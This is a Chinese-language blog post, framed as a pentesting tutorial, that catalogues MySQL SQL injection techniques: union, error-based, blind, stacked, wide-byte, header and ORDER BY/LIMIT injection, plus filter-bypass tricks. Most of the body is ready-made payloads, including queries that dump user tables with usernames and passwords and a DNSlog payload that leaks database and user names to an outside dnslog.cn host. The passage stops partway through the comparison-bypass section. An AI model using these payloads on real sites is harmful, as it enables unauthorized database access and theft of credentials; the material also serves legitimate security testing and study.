href="/tags/Pikachu/" style="font-size: 1.05rem; color: rgb(32, 192, 110);">Pikachu<sup>1</sup></a><a href="/tags/SQL/" style="font-size: 1.05rem; color: rgb(43, 154, 118);">SQL<sup>2</sup></a><a href="/tags/XAUUSD/" style="font-size: 1.05rem; color: rgb(101, 99, 75);">XAUUSD<sup>1</sup></a><a href="/tags/XSS/" style="font-size: 1.05rem; color: rgb(91, 24, 32);">XSS<sup>2</sup></a><a href="/tags/%E3%80%8AJavaScript%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E3%80%8B/" style="font-size: 1.05rem; color: rgb(160, 162, 80);">《JavaScript权威指南》<sup>17</sup></a><a href="/tags/%E5%8C%BF%E5%90%8D/" style="font-size: 1.05rem; color: rgb(31, 146, 158);">匿名<sup>3</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 1.05rem; color: rgb(117, 11, 21);">博客<sup>10</sup></a><a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem; color: rgb(163, 139, 156);">安全<sup>20</sup></a><a href="/tags/%E6%94%AF%E4%BB%98/" style="font-size: 1.05rem; color: rgb(5, 182, 73);">支付<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2/" style="font-size: 1.05rem; color: rgb(162, 100, 74);">攻防<sup>1</sup></a><a href="/tags/%E6%97%85%E8%A1%8C/" style="font-size: 1.05rem; color: rgb(121, 17, 20);">旅行<sup>1</sup></a><a href="/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/" style="font-size: 1.05rem; color: rgb(34, 65, 156);">虚拟机<sup>4</sup></a><a href="/tags/%E8%B6%8A%E6%9D%83/" style="font-size: 1.05rem; color: rgb(155, 79, 125);">越权<sup>2</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">五月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/04/"><span class="card-archive-list-date">四月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">37</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/03/"><span class="card-archive-list-date">三月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url">技术</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8/" itemprop="url">安全</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>安全</span></a><a class="article-meta__tags" href="/tags/SQL/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>SQL</span></a></span></div></div><h1 class="post-title" itemprop="name headline">SQL注入详解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-04-20T16:00:00.000Z" title="发表于 2023-04-21 00:00:00">2023-04-21</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-04-20T17:43:48.000Z" title="更新于 2023-04-21 01:43:48">2023-04-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入详解"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover3.jpg"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://www.houyanbin.com/2023/04/21/%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"><header><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url">技术</a><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8/" itemprop="url">安全</a><a href="/tags/%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">安全</a><a href="/tags/SQL/" tabindex="-1" itemprop="url">SQL</a><h1 id="CrawlerTitle" itemprop="name headline">SQL注入详解</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Jack hou</span><time itemprop="dateCreated datePublished" datetime="2023-04-20T16:00:00.000Z" title="发表于 2023-04-21 00:00:00">2023-04-21</time><time itemprop="dateCreated datePublished" datetime="2023-04-20T17:43:48.000Z" title="更新于 2023-04-21 01:43:48">2023-04-21</time></header><meta name="referrer" content="no-referrer"/>


<h2 id="一、sql-注入概述"><a href="#一、sql-注入概述" class="headerlink" title="一、sql 注入概述"></a>一、sql 注入概述</h2><p> SQL 注入即是指 web 应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在 web 应用程序中事先定义好的查询语句的结尾上添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息, 在实战和测试中，难免会遇见到一些 sql 注入，下面，我将总结一些常用 sql 注入中的不同姿势。</p>
<h2 id="二、寻找-sql-注入"><a href="#二、寻找-sql-注入" class="headerlink" title="二、寻找 sql 注入"></a>二、寻找 sql 注入</h2><p>测试注入点：</p>
<p>1. 在参数后面添加单引号或双引号，查看返回包，如果报错或者长度变化，可能存在 Sql 注入</p>
<p>注入点判断：<code>id=1&#39;（常见）</code>id&#x3D;1”id&#x3D;1’) id&#x3D;1’)) id&#x3D;1”) id&#x3D;1”))</p>
<p>2. 通过构造 get、post、cookie 请求再相应的 http 头信息等查找敏感喜喜</p>
<p>3. 通过构造一些语句，检测服务器中响应的异常</p>
<h2 id="三、sql-注入的类型"><a href="#三、sql-注入的类型" class="headerlink" title="三、sql 注入的类型"></a>三、sql 注入的类型</h2><p>附上自己整理的思维导图学习</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765090_62cf7ce22bc5cb101dc1b.png!small"></p>
<p>常见的数据库类型，分为关系型数据库和非关系型数据库</p>
<p>关系型数据库有 <code>Oracle、DB2、PostgreSQL、Microsoft SQL Server、Microsoft Access 和 MySQL</code>等。</p>
<p>非关系型数据库有 <code>Neo4j、MongoDB、Redis、Memcached、MemcacheDB 和 HBase</code>等</p>
<h2 id="Mysql-注入"><a href="#Mysql-注入" class="headerlink" title="Mysql 注入"></a>Mysql 注入</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765211_62cf7d5ba9f990b10b6f3.png!small"></p>
<h3 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h3><p>数字型：</p>
<p>测试步骤：</p>
<p>（1） 加单引号，URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3’；</p>
<p>对应的 sql：select * from table where id&#x3D;3’ 这时 sql 语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p>
<p>（2） 加 and 1&#x3D;1 ，URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3 and 1&#x3D;1；</p>
<p>对应的 sql：select * from table where id&#x3D;3’ and 1&#x3D;1 语句执行正常，与原始页面没有差异；</p>
<p>（3） 加 and 1&#x3D;2，URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3 and 1&#x3D;2；</p>
<p>对应的 sql：select * from table where id&#x3D;3 and 1&#x3D;2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异；</p>
<p>字符型</p>
<p>测试步骤：</p>
<p>（1） 加单引号：select * from table where name&#x3D;’admin’’；</p>
<p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p>
<p>（2） 加’and 1&#x3D;1 此时 sql 语句为：select * from table where name&#x3D;’admin’and 1&#x3D;1’ ，也无法进行注入，还需要通过注释符号将其绕过；</p>
<p>因此，构造语句为：select * from table where name &#x3D;’admin’ and 1&#x3D;–’ 可成功执行返回结果正确；</p>
<p>（3） 加 and 1&#x3D;2— 此时 sql 语句为：select * from table where name&#x3D;’admin’ and 1&#x3D;2–’则会报错；</p>
<p>如果满足以上三点，可以判断该 url 为字符型注入。</p>
<p>判断列数：</p>
<p>?id&#x3D;1’ order by 4# 报错</p>
<p>?id&#x3D;1’ order by 3# 没有报错，说明存在 3 列</p>
<p>爆出数据库：</p>
<p>?id&#x3D;-1’ union select 1,database(),3–+</p>
<p>?id&#x3D;-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata#</p>
<p>爆出数据表：</p>
<p>?id&#x3D;-1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’数据库’#</p>
<p>爆出字段：</p>
<p>?id&#x3D;-1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’数据表’#</p>
<p>爆出数据值：</p>
<p>?id&#x3D;-1’ union select 1,group_concat(0x7e, 字段, 0x7e),3 from 数据库名. 数据表名 –+</p>
<p>拓展一些其他函数：</p>
<p>system_user() 系统用户名</p>
<p>user() 用户名</p>
<p>current_user 当前用户名</p>
<p>session_user() 连接数据库的用户名</p>
<p>database() 数据库名</p>
<p>version() MYSQL 数据库版本</p>
<p>load_file() MYSQL 读取本地文件的函数</p>
<p>@@datadir 读取数据库路径</p>
<p>@@basedir MYSQL 安装路径</p>
<p>@@version_compile_os 操作系统</p>
<p>多条数据显示函数：</p>
<p>concat()、group_concat()、concat_ws()</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>extractvalue 函数：</p>
<p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select @@version),0x7e))–+ (爆出版本号)</p>
<p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select @@version_compile_os),0x7e))–+ (爆出操作系统)</p>
<p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e))–+ （爆数据库）</p>
<p>?id&#x3D;1’and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e))–+ （爆数据表）</p>
<p>?id&#x3D;1’and extractvalue(1, concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 3,1),0x7e))–+（爆字段）</p>
<p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e))–+ （爆数据）</p>
<p>updatexml 函数：</p>
<p>细节问题： extractvalue() 基本一样，改个关键字 updatexml 即可, 与 extractvalue 有个很大的区别实在末尾注入加上，如：（1，concat(select @@version),1), 而 extractvalue 函数末尾不加 1（数值）</p>
<p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),<strong><code>1</code></strong>)–+ （爆数据库）</p>
<p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),0x7e),1)–+ （爆数据表）</p>
<p>?id&#x3D;1’and updatexml(1, concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 3,1),0x7e),1)–+ （爆字段）</p>
<p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e),1)–+</p>
<p>exp 函数溢出错误：</p>
<p>在 mysql&gt;5.5.53 时，则不能返回查询结果</p>
<p>floor 函数：</p>
<p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select database()),0x7e,floor(rand(0)2))a from information_schema.schemata group by a–+</p>
<p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ (爆数据库，不断改变 limit 得到其他)</p>
<p>?id&#x3D;1’union select 1,count(),concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ （爆出 users 表）</p>
<p>?id&#x3D;1’union select 1,count(),concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ （爆出 password 字段）</p>
<p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select password from security.users limit 2,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ （爆出数值）</p>
<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>判断注入点：</p>
<p>?id&#x3D;1’ and sleep(5)–+ &#x2F;&#x2F; 正常休眠</p>
<p>?id&#x3D;1” and sleep(5)–+ &#x2F;&#x2F; 无休眠</p>
<p>?id&#x3D;1’) and sleep(5)–+&#x2F;&#x2F; 无休眠</p>
<p>?id&#x3D;1”) and sleep(5)–+&#x2F;&#x2F; 无休眠</p>
<p>?id&#x3D;1’ and if(length(database())&#x3D;8,sleep(10),1)–+</p>
<p>爆出数据库：</p>
<p>?id&#x3D;1’ and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(10))–+</p>
<p>通过判断服务器没有睡眠，ascii 码转换 115 为 s ，那么就得出数据库第一个字符为 s, 下面就可以一次类推了, 就不一</p>
<p>substr(database(),N,1) 可以通过改变 N 的值来判断数据的地几个字符为什么</p>
<p>爆出数据表：</p>
<p>?id&#x3D;1’and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;”security”limit 0,1),1,1)))&#x3D;101,sleep(5),1)– -</p>
<p>解释：security 的第一张表的第一个字符 ascii 为 101，为字符 e</p>
<p> limit 0,1),N,1 还是改变 N 的的得出第二个字符</p>
<p>再判断字符（ascii 判断）</p>
<p>?id&#x3D;1” and if(ascii(substr(database(),1,1))&gt;115,1,sleep(3))–+</p>
<p>（left 语句判断）</p>
<p>?id&#x3D;1’and if(left(database(),1)&#x3D;’s’,sleep(10),1) –+</p>
<p>?id&#x3D;1’and if(left(database(),2)&#x3D;’sa’,sleep(10),1) –+</p>
<p>Substring 函数判断</p>
<p>type&#x3D;if(substring((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1&#x3D;’a’),11111,sleep(1))–+</p>
<p>附上一篇文档（盲注脚本）：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin/_41598660/article/details/105162513">https://blog.csdn.net/weixin\_41598660/article/details/105162513</a></p>
<h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><p>Left 判断</p>
<p>?id&#x3D;1’and left(database(),1)&#x3D;’s’ –+</p>
<p>?id&#x3D;1’and left(database(),2) &gt;’sa’ –+</p>
<p>Like 语句判断</p>
<p>?id&#x3D;1’and (select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)like’e%’–+</p>
<p>Ascii 语句判断</p>
<p>and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;115–+</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>?id&#x3D;1’ order by 3%23</p>
<p>?id&#x3D;1’;show tables%23</p>
<p>?id&#x3D;-1’;show columns from <code>1919810931114514</code>%23</p>
<p>?id&#x3D;1’; insert into users(id,username,password) values(88,’aaa’,’bbb’)#  </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765459_62cf7e536914d9a20eebd.png!small"></p>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入一般是用于白盒测试、黑盒测试就算是找到注入也没办法攻击。  </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765520_62cf7e901e5532a44c092.png!small"></p>
<p>博客链接：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/39917830">https://zhuanlan.zhihu.com/p/39917830</a></p>
<h3 id="加密解密注入"><a href="#加密解密注入" class="headerlink" title="加密解密注入"></a>加密解密注入</h3><p>Cookie: uname&#x3D;YWRtaW4%3D</p>
<p>YWRtaW4%3D 这是一个 base64 加密的字符串其中 %3D 是编码中的 &#x3D; 符号，把他发送到编码模块当中解密, 得到明文</p>
<p>发现这个是注入点需要将原来的注入方式重新加密发送给服务器，可以构造注入语句进行 base64 加密进行报错注入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765539_62cf7ea3330691d8a8415.png!small"></p>
<h3 id="Dnslog-对外注入"><a href="#Dnslog-对外注入" class="headerlink" title="Dnslog 对外注入"></a>Dnslog 对外注入</h3><p>通常我们面对 SQL 注入过程中没有回显的情况下，只能通过盲注的方式来判断是否存在 SQL 注入，但是，使用盲注，手工测试是需要花费大量的时间的，可能会想到使用 sqlmap 直接去跑出数据，但在实际测试中，使用 sqlmap 跑盲注，有很大的几率，网站把 ip 给封掉，这就影响了我们的测试进度，也许你也可以使用代理池</p>
<p>注入语句：</p>
<p>?id&#x3D;1’and (select load_file(concat(‘\\‘,(select hex(user())),’.682y4b.dnslog.cn&#x2F;abc’))) –+</p>
<p>?id&#x3D;1’and (select load_file(concat(‘\\‘,(select database()),’.682y4b.dnslog.cn&#x2F;abc’))) –+</p>
<h3 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h3><p>比如受害者网站 URL 注入点是经过编码的，不能直接结合 sqlmap 进行漏洞利用，所以本地搭建一个网站，写一个 php 脚本编码文件，就可以结合 sqlmap 工具进行测试。</p>
<p>因为，注入点经过复杂编码之后，就不能直接结合 sqlmap 进行漏洞攻击了。或者 sqlmap 自己编写 tamper 脚本进行攻击</p>
<p>可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin/_40412037/article/details/110088186">https://blog.csdn.net/weixin\_40412037/article/details/110088186</a></p>
<h3 id="搜索框注入"><a href="#搜索框注入" class="headerlink" title="搜索框注入"></a>搜索框注入</h3><p>注入 payload：</p>
<p>%’and’%1%’&#x3D;’%1</p>
<p>%’and’%1%’&#x3D;’%2</p>
<p>Sql 数据库语句：select * from sqltest where names like ‘% 要查询的关键字 %’</p>
<p>a%’ and 1&#x3D;1– 正常</p>
<p>a%’ and 1&#x3D;2– 错误</p>
<p>有搜索数据的框可以试试加个 % 总能大力出奇迹</p>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>前提</p>
<p>1. 使用了 addslashes() 函数</p>
<p>2. 数据库设置了编码模式为 GBK</p>
<p>原理：前端输入 %df 时，首先经过 addslashes() 转义变成 %df%5c%27，之后，在数据库查询前，因为设置了 GBK 编码，GBK 编码在汉字编码范围内的两个字节都会重新编码成一个汉字。然后 mysql 服务器会对查询的语句进行 GBK 编码，%df%5c 编码成了 “运”，而单引号逃逸了出来，形成了注入漏洞</p>
<p>?id&#x3D;%df’ and 1&#x3D;1 –+</p>
<p>?id&#x3D;%df’ and 1&#x3D;2 –+</p>
<p>?id&#x3D;-1%df’ union select 1,2,3 %23</p>
<h3 id="Cookie-注入和-Xff-注入"><a href="#Cookie-注入和-Xff-注入" class="headerlink" title="Cookie 注入和 Xff 注入"></a>Cookie 注入和 Xff 注入</h3><p>主要是看看程序员有没有在 cookie 中做了一些过滤，我们有没有可趁之机。</p>
<p>Cookie: ‘ order by 4–+</p>
<p>X-Forwarded-For 注入</p>
<p>代表客户端真实的 IP，通过修改 X-Forwarded-for 的值可以伪造客户端 IP</p>
<p>尝试抓包添加插入 X-Forwarded-For:127.0.0.1 头进行 sql 注入</p>
<h3 id="Between-注入"><a href="#Between-注入" class="headerlink" title="Between 注入"></a>Between 注入</h3><p>主要用于盲注看页面是否有变化，原理如下，例如 username 的字符内容是 test1，第一个字符是 t，a 到 b 搜索不了，页面不正常。 a 到 t 就有了，页面正常</p>
<p>mysql 语句： select * from users where id &#x3D;1 and substr(username,1,1) between ‘a’ and ‘b’;</p>
<p>select * from users where id &#x3D;1 and substr(username,1,1) between ‘a’ and ‘t’;</p>
<p>借鉴大佬图片：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765568_62cf7ec07edc75bbb2cd0.png!small"></p>
<h3 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h3><p>mysql 语句： select * from limit test limit 1,[可控点] or select … limit [可控点]</p>
<p>limit 后面能够拼接的函数只有 into 和 procedure，into 可以用来写文件，本文我们不考虑。在 Limit 后面 可以用 procedure analyse() 这个子查询，而且只能用 extractvalue 和 benchmark 函数进行延时</p>
<p><em><strong>procedure analyse(updatexml(rand(),concat(0x3a,benchmark(10000000,sha1(1)))),1)</strong></em></p>
<p>select id from users;</p>
<p>select id from users limit 0,1 union select username from users;</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765587_62cf7ed363bca35f96495.png!small"></p>
<p>select field from user where id &gt;0 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</p>
<p>基于时间盲注：</p>
<p>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</p>
<h3 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h3><p>select * from 表名 order by 列名 (或者数字) asc；升序 (默认升序)</p>
<p>select * from 表名 order by 列名 (或者数字) desc；降序</p>
<p>当页面出现 mysql 报错信息时，注入点在 order by 后面，此时可以利用报错信息进行注入，尝试报错注入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765602_62cf7ee2335a18b91bc38.png!small"></p>
<p>?sort&#x3D;1 and(select extractvalue(0x7e,concat(0x7e,database(),0x7e)))</p>
<p>?sort&#x3D;(select 1 from(select 1 and if(ascii(substr((user()),1,1))&#x3D;114,sleep(5),1))x)</p>
<h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h3><p>两个空格代替一个空格，用 Tab 代替空格，%a0 &#x3D; 空格：</p>
<p>payload:</p>
<p>%20 %09 %0a %0b %0c %0d %a0 %00 &#x2F;**&#x2F; &#x2F;<em>!</em>&#x2F;</p>
<p>最基本的绕过方法，用注释替换空格： &#x2F;* 注释 *&#x2F;</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765618_62cf7ef2f3244c1249103.png!small"></p>
<p>括号绕过空格</p>
<p>mysql 语句：select(user())from dual where(1&#x3D;1)and(2&#x3D;2)</p>
<p>这种过滤方法常常用于 time based 盲注, 例如：</p>
<p>?id&#x3D;1%27and(sleep(ascii(mid(database()from(1)for(1)))&#x3D;109))%23</p>
<h3 id="绕过引号"><a href="#绕过引号" class="headerlink" title="绕过引号"></a>绕过引号</h3><p>这个时候如果引号被过滤了，那么上面的 where 子句就无法使用了。那么遇到这样的问题就要使用<strong>十六进制</strong>来处理这个问题了。users 的十六进制的字符串是 7573657273。那么最后的 sql 语句就变为了：</p>
<p>select column_name from information_schema.tables where table_name&#x3D;0x7573657273</p>
<h3 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a>绕过逗号</h3><p>在使用盲注的时候，需要使用到 substr(),mid(),limit。这些子句方法都需要使用到逗号。对于 substr() 和 mid() 这两个方法可以使用 from to 的方式来解决：</p>
<p>select substr(database() from 1 for 1);</p>
<p>select mid(database() from 1 for 1);</p>
<p>使用 join：</p>
<p>union select 1,2#</p>
<p>等价于 union select * from (select 1)a join (select 2)b</p>
<p>使用 like:</p>
<p>select ascii(mid(user(),1,1))&#x3D;80 #</p>
<p>等价于 select user() like ‘r%’</p>
<p>对于 limit 可以使用 offset 来绕过：</p>
<p>select * from news limit 0,1 #</p>
<p>等价于下面这条 SQL 语句 select * from news limit 1 offset 0</p>
<h3 id="绕过比较符号"><a href="#绕过比较符号" class="headerlink" title="绕过比较符号 ()"></a>绕过比较符号 ()</h3><p>（过滤了 &lt;&gt;：sqlmap 盲注经常使用 &lt;&gt;，使用 between 的脚本）：</p>
<p>使用 greatest()、least（）：（前者返回最大值，后者返回最小值）</p>
<p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到 greatest 来进行绕过了。 最常见的一个盲注的 sql 语句：</p>
<p>select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;64</p>
